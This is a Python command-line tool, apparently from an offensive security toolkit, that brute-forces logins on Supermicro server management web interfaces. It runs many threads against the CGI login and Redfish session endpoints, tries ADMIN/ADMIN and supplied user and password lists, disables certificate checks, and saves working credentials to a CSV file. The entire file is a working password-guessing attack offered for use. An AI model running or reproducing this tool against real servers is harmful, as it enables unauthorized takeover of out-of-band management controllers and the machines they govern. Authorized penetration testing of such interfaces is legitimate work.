#! /usr/bin/env python3

import requests, warnings
from datetime import date
from base64 import b64encode
from queue import Queue, Empty
from urllib.parse import quote
from argparse import ArgumentParser
from threading import Thread, Lock
from colorama import Fore, Back, Style
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

scheme = "https"
login_endpoint = "/cgi/login.cgi"
redfish_login_endpoint = "/redfish/v1/SessionService/Sessions"
lock = Lock()
thread_count = 20
successful_logins = {}
warnings.filterwarnings('ignore')

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments():
    description = "SuperMicro Web Interface Brute Force"
    parser = ArgumentParser(description=description)
    parser.add_argument('-s', "--server", type=str, help="Target Supermicro Server (seperated by ',' or File Name)", required=True)
    parser.add_argument('-u', "--users", type=str, help="Target Users (seperated by ',') or File containing List of Users")
    parser.add_argument('-P', "--password", type=str, help="Passwords (seperated by ',') or File containing List of Passwords")
    parser.add_argument('-c', "--credentials", type=str, help="Name of File containing Credentials in format ({user}:{password})")
    parser.add_argument('-S', "--scheme", type=str, help="Scheme to use", default=scheme)
    parser.add_argument('-t', "--timeout", type=int, help="Timeout for Login Request", default=None)
    parser.add_argument('-T', "--threads", type=int, help="Brute Force Threads", default=thread_count)
    parser.add_argument('-w', "--write", type=str, help="CSV File to Dump Successful Logins", default=f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv")
    return parser.parse_args()

def login(server, username='ADMIN', password='ADMIN', scheme="http", timeout=None):
    t1 = time()
    try:
        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False, timeout=timeout)
        authorization_status = True if "Set-Cookie" in response.headers.keys() else False
        if authorization_status:
            t2 = time()
            return authorization_status, t2-t1

        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={username}&pwd={password}", verify=False, timeout=timeout)
        authorization_status = True if "Set-Cookie" in response.headers.keys() else False
        if authorization_status:
            t2 = time()
            return authorization_status, t2-t1

        response = requests.post(f"{scheme}://{server}{redfish_login_endpoint}", json={"UserName": username, "Password": password}, verify=False, timeout=timeout)
        authorization_status = True if response.status_code // 100 == 2 else False
        t2 = time()
        return authorization_status, t2-t1
    except Exception as error:
        t2 = time()
        return error, t2-t1
def brute_force(process_index, queue, scheme="http", timeout=None):
    while True:
        try:
            server, credential = queue.get_nowait()
        except Empty:
            break
        status = login(server, credential[0], credential[1], scheme, timeout)
        if status[0] == True:
            with lock:
                successful_logins[server] = [credential[0], credential[1]]
                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
        elif status[0] == False:
            with lock:
                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
        else:
            with lock:
                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
        queue.task_done()
    return successful_logins
def main(servers, credentials, scheme="http", timeout=None, thread_count=thread_count):
    queue = Queue()
    for credential in credentials:
        for server in servers:
            queue.put((server, credential))
    threads = []
    for index in range(thread_count):
        threads.append(Thread(target=brute_force, args=(index, queue, scheme, timeout)))
        threads[-1].start()
    for thread in threads:
        thread.join()
    display('+', f"Processs Finished Excuting")

if __name__ == "__main__":
    arguments = get_arguments()
    try:
        with open(arguments.server, 'r') as file:
            arguments.server = [server for server in file.read().split('\n') if server != '']
    except FileNotFoundError:
        arguments.server = arguments.server.split(',')
    except Exception as error:
        display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
        exit(0)
    if not arguments.credentials:
        if not arguments.users:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            arguments.users = ['']
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            arguments.password = ['']
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    main(arguments.server, arguments.credentials, arguments.scheme, arguments.timeout, arguments.threads)
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.server) * len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
    if len(successful_logins) > 0:
        with open(arguments.write, 'w') as file:
            file.write(f"Server,User,Password\n")
            file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
        display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")